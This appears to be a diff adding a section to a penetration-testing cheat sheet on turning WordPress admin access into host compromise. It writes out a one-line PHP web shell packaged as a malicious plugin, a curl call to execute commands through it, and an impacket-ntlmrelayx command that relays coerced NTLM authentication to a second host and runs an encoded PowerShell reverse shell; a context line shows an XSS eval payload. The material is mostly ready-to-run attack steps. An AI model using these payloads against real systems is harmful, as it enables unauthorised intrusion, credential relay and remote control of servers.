@@ -288,6 +288,36 @@ curl -i {{URL}} --user-agent "<script>eval(String.fromCharCode(<ENCODED_INTS>))<
 
 ---
 
+# WordPress — Post-Auth to RCE / Relay (supplement)
+
+> Once you hold WordPress **admin** (cracked creds, the XSS admin-create above, or a kerberoasted
+> service account that runs the site), two routes to the host:
+
+**1 — Malicious plugin → web / reverse shell.** Upload a zipped plugin containing PHP (or edit an
+existing plugin/theme file under **Appearance → Theme/Plugin Editor**), then hit it:
+
+```bash
+# minimal plugin file — zip as evil/evil.php, upload via Plugins > Add New > Upload Plugin:
+#   <?php /*Plugin Name: evil*/ system($_GET['cmd']); ?>
+curl "{{URL}}/wp-content/plugins/evil/evil.php?cmd=id"      # confirm RCE, then upgrade to a rev shell
+```
+
+**2 — Force NTLM auth → relay (no host creds needed).** Some plugins take a **path/URL** field (e.g.
+*Backup Migration*'s "Backup directory path"). Point it at a UNC path to Kali to coerce the web
+server's account to authenticate to you, and relay that auth to a second host where the local admin
+password is reused (target must have **SMB signing off**):
+
+```bash
+# on Kali: relay the coerced auth to the second host, run a command on success
+sudo impacket-ntlmrelayx --no-http-server -smb2support -t {{TARGET_IP}} -c "powershell -enc <BASE64_REVSHELL>"
+# then set the plugin's path field to:   //{{LHOST}}/test   and click Save
+```
+
+> The `ntlmrelayx` mechanics + SMB-signing / UAC caveats live in
+> [../exploits/exploits.md](../exploits/exploits.md) §16.6.4 — this is just the WordPress trigger for it.
+
+---
+
 # PortSwigger — XSS Cheat Sheet
 
 > Contexts, sinks and payloads from the PortSwigger Web Security Academy. https://portswigger.net/web-security/cross-site-scripting · [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
